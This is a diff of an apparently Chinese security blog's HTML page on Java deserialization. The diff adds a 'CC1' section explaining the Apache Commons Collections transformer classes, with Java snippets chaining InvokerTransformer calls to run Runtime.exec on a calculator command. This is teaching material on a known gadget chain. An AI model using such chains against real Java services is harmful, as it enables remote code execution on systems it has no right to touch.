@@ -32,7 +32,7 @@
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "http:\/\/5ky.top\/posts\/deserialization\/"
-        },"genre": "posts","keywords": "反序列化","wordcount":  688 ,
+        },"genre": "posts","keywords": "反序列化","wordcount":  1691 ,
         "url": "http:\/\/5ky.top\/posts\/deserialization\/","datePublished": "2025-04-09T20:42:21+08:00","dateModified": "2025-04-09T20:42:21+08:00","license": "This is a web security knowledge sharing blog. About reading, movies, living, growing up, Fly with 5ky ～","publisher": {
             "@type": "Organization",
             "name": ""},"author": {
@@ -106,8 +106,8 @@
             <div class="toc-content" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX"> Java反序列化</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Ty</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>网络安全</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2025-04-09">2025-04-09</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;约 688 字&nbsp;
-                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;预计阅读 2 分钟&nbsp;
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2025-04-09">2025-04-09</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;约 1691 字&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;预计阅读 4 分钟&nbsp;
     
 
     
@@ -132,6 +132,12 @@
     <li><a href="#一原理">一、原理</a></li>
     <li><a href="#直接实现">直接实现</a></li>
     <li><a href="#urldns">URLDNS</a></li>
+    <li><a href="#cc1">CC1</a>
+      <ul>
+        <li><a href="#前置知识">前置知识</a></li>
+        <li><a href="#攻击构造">攻击构造</a></li>
+      </ul>
+    </li>
   </ul>
 </nav></div>
             </div><div class="content" id="content"><h2 id="一原理">一、原理</h2>
@@ -355,7 +361,146 @@
 </div>
 </div><p>ObjectInputStream &gt; readObject</p>
 <p>HashMap 重写了 readObject，readObject实现sink点（执行hashCode）</p>
-</div><div class="post-footer" id="post-footer">
+<p>内存 到 磁盘</p>
+<h2 id="cc1">CC1</h2>
+<h3 id="前置知识">前置知识</h3>
+<ul>
+<li>
+<p>抽象类 org.apache.commons.collections.map.AbstractMapDecorator，是 Map 的扩展，给Map提供附加功能（装饰器：动态给对象添加新功能而不改变其原有结构的设计模式），所有的操作都转发给这个 Map；实现类有很多（各个类触发的方式不同），重点关注 TransformedMap、LazyMap</p>
+<ul>
+<li>org.apache.commons.collections.map.TransformedMap
+<ul>
+<li>当元素加入集合内时，自动对元素修饰变换（变换逻辑由 Transformer 来定义，Transformer 在 TransformedMap 实例化时作为参数传入）当 TransformedMap 内的 key 或者 value 发生变化时（例如调用 TransformedMap 的 <code>put</code> 方法时），就会触发相应参数的 Transformer 的 <code>transform()</code> 方法。</li>
+<li>
+<figure><a class="lightgallery" href="/posts/deserialization/1626657477238.png" title="img" data-thumbnail="/posts/deserialization/1626657477238.png" data-sub-html="<h2> </h2><p>img</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/deserialization/1626657477238.png"
+            data-srcset="/posts/deserialization/1626657477238.png, /posts/deserialization/1626657477238.png 1.5x, /posts/deserialization/1626657477238.png 2x"
+            data-sizes="auto"
+            alt="/posts/deserialization/1626657477238.png" width="2474" height="1506" />
+    </a><figcaption class="image-caption">img</figcaption>
+    </figure></li>
+</ul>
+</li>
+<li>org.apache.commons.collections.map.LazyMap，与 TransformedMap 类似
+<ul>
+<li>差异是调用 <code>get()</code> 方法时如果传入的 key 不存在，则会触发相应参数的 Transformer 的 <code>transform()</code> 方法。</li>
+</ul>
+</li>
+<li>org.apache.commons.collections.map.DefaultedMap，与 LazyMap 具有相同功能的，是同样是 <code>get()</code> 方法会触发 transform() 方法。</li>
+</ul>
+</li>
+<li>
+<p>org.apache.commons.collections.Transformer接口，提供了<code>transform()</code> 方法（用来定义具体的转换逻辑），方法接收 Object 类型的 input，处理后将 Object 返回。3.2.1 中提供了 14 个 Transformer 的实现类（用来实现不同的对 TransformedMap 中 key/value 进行修改的功能）重点关注其中几个实现类InvokerTransformer、ChainedTransformer、ConstantTransformer</p>
+<ul>
+<li>
+<p>
+<figure><a class="lightgallery" href="/posts/deserialization/1626658616554.png" title="img" data-thumbnail="/posts/deserialization/1626658616554.png" data-sub-html="<h2> </h2><p>img</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/deserialization/1626658616554.png"
+            data-srcset="/posts/deserialization/1626658616554.png, /posts/deserialization/1626658616554.png 1.5x, /posts/deserialization/1626658616554.png 2x"
+            data-sizes="auto"
+            alt="/posts/deserialization/1626658616554.png" width="2542" height="1298" />
+    </a><figcaption class="image-caption">img</figcaption>
+    </figure></p>
+</li>
+<li>
+<p>org.apache.commons.collections.functors.InvokerTransformer 从 3.0 引入，功能是使用反射创建一个新对象</p>
+<ul>
+<li>
+<p>
+<figure><a class="lightgallery" href="/posts/deserialization/1626659439242.png" title="img" data-thumbnail="/posts/deserialization/1626659439242.png" data-sub-html="<h2> </h2><p>img</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/deserialization/1626659439242.png"
+            data-srcset="/posts/deserialization/1626659439242.png, /posts/deserialization/1626659439242.png 1.5x, /posts/deserialization/1626659439242.png 2x"
+            data-sizes="auto"
+            alt="/posts/deserialization/1626659439242.png" width="1950" height="862" />
+    </a><figcaption class="image-caption">img</figcaption>
+    </figure></p>
+</li>
+<li>
+<p>调用需要的参数 iMethodName、iParamTypes 是在 InvokerTransformer 的构造函数中传入。这样我们就可以使用 InvokerTransformer 来执行方法，测试代码：</p>
+</li>
+<li>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">// InvokerTransformer 弹计算器测试</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Transformer</span><span class="w"> </span><span class="n">transformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;open -a Calculator.app&#34;</span><span class="p">});</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">transformer</span><span class="p">.</span><span class="na">transform</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">());</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+</ul>
+</li>
+<li>
+<p>org.apache.commons.collections.functors.ChainedTransformer</p>
+<ul>
+<li>这个类自己维护了一个 Transformer 数组， 在调用 ChainedTransformer 的 transform 方法时，会循环数组，依次调用 Transformer 数组中每个 Transformer 的 transform 方法，并将结果传递给下一个 Transformer。</li>
+<li>
+<figure><a class="lightgallery" href="/posts/deserialization/1626665059905.png" title="img" data-thumbnail="/posts/deserialization/1626665059905.png" data-sub-html="<h2> </h2><p>img</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/deserialization/1626665059905.png"
+            data-srcset="/posts/deserialization/1626665059905.png, /posts/deserialization/1626665059905.png 1.5x, /posts/deserialization/1626665059905.png 2x"
+            data-sizes="auto"
+            alt="/posts/deserialization/1626665059905.png" width="1108" height="494" />
+    </a><figcaption class="image-caption">img</figcaption>
+    </figure></li>
+</ul>
+</li>
+<li>
+<p>org.apache.commons.collections.functors.ConstantTransformer</p>
+<ul>
+<li>返回固定常量的 Transformer，在初始化时储存了一个 Object，后续的调用时会直接返回这个 Object。</li>
+<li>ConstantTransformer 和 ChainedTransformer 配合，将其结果传入 InvokerTransformer 来调用我们指定的类的指定方法。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="攻击构造">攻击构造</h3>
+<p>如执行 <code>Runtime.getRuntime().exec(&quot;open -a Calculator.app&quot;)</code>。按照需求对其进行拆分，这里使用 TransformedMap 触发，实例代码如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">// 结合 ChainedTransformer</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ChainedTransformer</span><span class="w"> </span><span class="n">chain</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ChainedTransformer</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">Transformer</span><span class="o">[]</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="na">class</span><span class="p">),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;getMethod&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;getRuntime&#34;</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">}),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;invoke&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">}),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;open -a Calculator.app&#34;</span><span class="p">})</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">});</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Map</span><span class="w"> </span><span class="n">map2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TransformedMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="n">hashMap</span><span class="p">,</span><span class="w"> </span><span class="n">chain</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">map2</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">10</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;aaa&#34;</span><span class="p">);</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div></div><div class="post-footer" id="post-footer">
     <div class="post-info">
         <div class="post-info-line">
             <div class="post-info-mod">
